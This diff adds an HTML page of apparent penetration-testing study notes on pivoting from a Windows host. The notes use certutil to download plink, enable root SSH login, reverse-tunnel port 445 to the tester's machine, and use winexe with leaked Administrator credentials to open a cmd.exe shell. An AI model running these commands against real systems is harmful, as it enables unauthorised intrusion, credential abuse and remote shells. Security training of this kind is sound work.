@@ -1,0 +1,42 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Port Foward</title>
+</head><body><span style="font-size: 14pt">Look at all incoming and outgoing connections <ul><li style="list-style-type: none">&gt; netstat -ano</li>
+<li style="list-style-type: none"/>
+</ul>
+==================================================<br/>
+</span><span style="font-size: 16pt">Plink.exe  &lt;--- used for port forwarding</span><span style="font-size: 14pt"/><span style="font-size: 14pt"><ul><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"><li style="list-style-type: none">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</li>
+</a><li style="list-style-type: none">Command line interface to <b>putty</b>(connecto to servers interface)</li>
+</ul>
+<br/>
+UPDOG plink.exe to download on server</span><ul><span style="font-size: 12pt"><li style="list-style-type: none">Download it on windows</li>
+</span><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 12pt">&gt; certutil -url cache -f &lt;link&gt; &lt;name the file&gt;</span><span style="font-size: 14pt"/></li>
+</ul>
+</li>
+</ul>
+<span style="font-size: 14pt"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">=====Creating the Port Forward=====</li>
+</ul>
+</li>
+</ul>
+</span><span style="font-size: 14pt">Change setting in ssh config</span><ul><span style="font-size: 14pt"><li style="list-style-type: none">&gt; nano /etc/ssh/sshd_config</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">Uncomment &gt;&gt;&gt; <b>PermitRootLogin prohibit-password</b></li>
+<li style="list-style-type: none">change to &gt;&gt;&gt;&gt;&gt;&gt;&gt; <b>PermitRootLogin yes</b></li>
+</span><li style="list-style-type: none"><span style="font-size: 14pt">***Allows us to connect to our machine from the windows as root***</span><span style="font-size: 12pt"/></li>
+<span style="font-size: 12pt"><li style="list-style-type: none"/>
+</span></ul>
+<span style="font-size: 14pt">Connect from Windows machine with Plink<br/>
+windows&gt; plink.exe -l root -pw toor -R 445:127.0.0.1:445 &lt;your ip&gt;<ul><li style="list-style-type: none"><span style="font-size: 12pt">Understand that you are portfowarding that first IP </span></li>
+</ul>
+=====Connect to your machine======<br/>
+<br/>
+<br/>
+==========================================================<br/>
+<br/>
+<span style="font-size: 16pt">**ONLY WORKS WITH CRED LEAK**</span><br/>
+<br/>
+Use tool winexe to gain a shell back from the ssh</span><ul><li style="list-style-type: none"><span style="font-size: 12pt">&gt; winexe -U Administrator%&lt;Password&gt; //127.0.0.1 &quot;cmd.exe&quot;</span><span style="font-size: 14pt"/></li>
+</ul>
+<span style="font-size: 14pt"><br/>
+</span></body></html>
